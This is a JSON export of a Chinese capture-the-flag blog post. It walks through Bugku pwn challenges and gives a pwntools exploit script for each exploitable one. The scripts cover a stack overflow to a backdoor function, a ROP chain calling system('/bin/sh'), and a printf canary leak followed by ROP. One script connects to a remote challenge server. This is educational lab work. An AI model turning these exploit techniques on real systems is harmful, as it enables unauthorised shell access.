{"title":"Bugku pwn","uid":"144f81ea5594fe5e9363a228d67919cf","slug":"Bugku-PWN","date":"2021-07-03T14:10:52.000Z","updated":"2021-10-16T10:01:08.005Z","comments":true,"path":"api/articles/Bugku-PWN.json","keywords":null,"cover":"https://i.loli.net/2021/07/04/Ow9MJU1YyhFeIjC.jpg","content":"<h1 id=\"overflow\"><a href=\"#overflow\" class=\"headerlink\" title=\"overflow\"></a>overflow</h1><p>check一下可以看到是64位程序，什么保护也没开，IDA查看，可以看到存在明显的栈溢出<img src=\"https://i.loli.net/2021/07/04/DjJPLQ2rEX34dvp.png\" alt=\"屏幕截图 2021-07-04 191959.png\"></p>\n<p>再看函数窗口，可以看见存在一个可疑的函数，点进去可以发现是一个后门函数</p>\n<p><img src=\"https://i.loli.net/2021/07/04/5kmnKT92g1wJoLD.png\" alt=\"屏幕截图 2021-07-04 193304.png\"></p>\n<p>所以思路就是利用栈溢出跳转到后门函数，这样就可以得到flag</p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./pwn2&quot;</span>)</span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x30</span>+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>+p64(<span class=\"number\">0x400769</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"overflow2\"><a href=\"#overflow2\" class=\"headerlink\" title=\"overflow2\"></a>overflow2</h1><p>check一下，64位开了NX保护。IDA查看，存在溢出<img src=\"https://i.loli.net/2021/07/04/onJhAYKWN8Sws5m.png\" alt=\"屏幕截图 2021-07-04 205321.png\"></p>\n<p>在函数窗口发现system函数，在字符串窗口发现bin/sh。可以利用ROP来获得shell<img src=\"https://i.loli.net/2021/07/04/3uyO7WHgLIjaEdX.png\" alt=\"image.png\"></p>\n<p>找到gadget的地址<img src=\"https://i.loli.net/2021/07/04/CGgJonulcmIMpwt.png\" alt=\"image.png\"></p>\n<p>构建payload就可以了</p>\n<h2 id=\"EXP-1\"><a href=\"#EXP-1\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./pwn5&quot;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;114.67.246.176&quot;</span>,<span class=\"number\">15097</span>)</span><br><span class=\"line\">sys_addr = <span class=\"number\">0x401050</span></span><br><span class=\"line\">bin_sh = <span class=\"number\">0x402004</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x40126b</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"read-note\"><a href=\"#read-note\" class=\"headerlink\" title=\"read_note\"></a>read_note</h1><p>签到题，直接可以获得flag</p>\n<h1 id=\"Canary\"><a href=\"#Canary\" class=\"headerlink\" title=\"Canary\"></a>Canary</h1><p>看题目就知道是考canary，check一下，发现是一个64位程序，开了canary和NX保护<img src=\"https://i.loli.net/2021/07/03/4kYTmvGypHW5uA1.png\" alt=\"image.png\"></p>\n<p>查看一下伪代码，很明显，存在栈溢出漏洞，read可以读取0x300字节，但缓冲区只有0x240字节空间<img src=\"https://i.loli.net/2021/07/03/MjuLO6KPTU42YZH.png\" alt=\"image.png\"></p>\n<p>查看字符串，发现存在bin/sh，在函数表里面也存在system函数<img src=\"https://i.loli.net/2021/07/03/YjeM5z9T8chxFtN.png\" alt=\"屏幕截图 2021-07-03 222006.png\"></p>\n<p>所以思路大概出来了，利用gadgets来获取shell。接下来就是思考如何解决canary保护，观察伪代码，里面有printf函数，我们可以利用printf函数来泄露canary，printf函数输出时会以x00为输出结尾，只要我们将canary值的x00覆盖掉就可以泄露了。</p>\n<p>所以，第一步，获取gadgets。因为是64位程序，所以传参时前六个参数是利用rdi, rsi, rdx, rcx, r8, r9寄存器来传递，所以需要将bin/sh传递到rdi寄存器。<img src=\"https://i.loli.net/2021/07/03/2RT6YD3ZijuXmnK.png\" alt=\"image.png\"></p>\n<p>接下来就是泄露canary，buf的偏移量是0x240-8(减8是因为canary的值在ebp减8的位置)，之后利用printf函数泄露即可。<img src=\"https://i.loli.net/2021/07/03/B8UpxXibkZD2VlI.png\" alt=\"image.png\"></p>\n<p>最后再组装一下就可以得出exp了。</p>\n<h2 id=\"EXP-2\"><a href=\"#EXP-2\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./pwn4_&#x27;</span>)</span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x400963</span></span><br><span class=\"line\">binsh = <span class=\"number\">0x601068</span></span><br><span class=\"line\">sys = <span class=\"number\">0x40080C</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">0x240</span> - <span class=\"number\">8</span>)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;Please leave your name(Within 36 Length):&#x27;</span>, payload)</span><br><span class=\"line\">p.recvline()</span><br><span class=\"line\">canary = p.recv(<span class=\"number\">7</span>).rjust(<span class=\"number\">8</span>, <span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> canary</span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span> * (<span class=\"number\">0x210</span> - <span class=\"number\">8</span>) + canary + <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span> + p64(pop_rdi) + p64(binsh) + p64(sys)</span><br><span class=\"line\">p.sendafter(<span class=\"string\">&#x27;Please leave a message(Within 0x200 Length):&#x27;</span> , payload1)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n","text":"overflowcheck一下可以看到是64位程序，什么保护也没开，IDA查看，可以看到存在明显的栈溢出 再看函数窗口，可以看见存在一个可疑的函数，点进去可以发现是一个后门函数 所以思路就是利用栈溢出跳转到后门函数，这样就可以得到flag EXP12345from pwn imp...","link":"","photos":[],"count_time":{"symbolsCount":"1.7k","symbolsTime":"2 mins."},"categories":[{"name":"刷题","slug":"刷题","count":6,"path":"api/categories/刷题.json"}],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#overflow\"><span class=\"toc-text\">overflow</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#overflow2\"><span class=\"toc-text\">overflow2</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-1\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#read-note\"><span class=\"toc-text\">read_note</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Canary\"><span class=\"toc-text\">Canary</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-2\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"ctfshow-misc","uid":"050531b15fb9d2cd0cab573b50dcfcd8","slug":"ctfshow-misc","date":"2021-10-05T14:43:36.000Z","updated":"2021-10-16T10:01:31.821Z","comments":true,"path":"api/articles/ctfshow-misc.json","keywords":null,"cover":"https://i.loli.net/2021/10/13/nMZwPpxO8NWJRi4.jpg","text":"misc1签到题，打开就有flag misc2打开txt文件出现一堆乱码，丢进winhex发现是png，直接改后缀名即可 misc3bpg文件使用bpgview工具打开，打开后即可获得flag ","link":"","photos":[],"count_time":{"symbolsCount":98,"symbolsTime":"1 mins."},"categories":[{"name":"刷题","slug":"刷题","count":6,"path":"api/categories/刷题.json"}],"tags":[{"name":"misc","slug":"misc","count":3,"path":"api/tags/misc.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}},"next_post":{"title":"ROP-x86","uid":"a1737faa9c5d2f3d8075974e9ccad146","slug":"ROP-x86","date":"2021-06-05T10:23:30.000Z","updated":"2021-10-20T05:26:51.435Z","comments":true,"path":"api/articles/ROP-x86.json","keywords":null,"cover":"https://i.loli.net/2021/06/06/3ZBmwPkcIXjUE17.jpg","text":"ROP原理随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadge...","link":"","photos":[],"count_time":{"symbolsCount":"7.4k","symbolsTime":"7 mins."},"categories":[{"name":"学习记录","slug":"学习记录","count":2,"path":"api/categories/学习记录.json"}],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}}}